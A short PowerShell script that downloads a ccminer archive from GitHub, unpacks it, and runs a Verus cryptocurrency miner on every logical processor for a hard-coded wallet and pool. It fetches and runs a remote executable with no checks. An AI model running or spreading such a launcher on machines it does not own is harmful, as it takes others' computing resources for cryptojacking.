$threads = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
$algorithm = "verus"
$server = "stratum+tcp://us.vipor.net:5040"
$user = "RHACKERwSVgjTvV4vNiTjmrkLTD7a92ALD.Triage"
$password = "x"

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MomboteQ/Free-Crypto-Mining/main/verus/ccminer-win.zip" -OutFile "ccminer.zip"
Expand-Archive ccminer.zip

.\ccminer\ccminer.exe -a $algorithm -o $server -u $user -p $password -t $threads
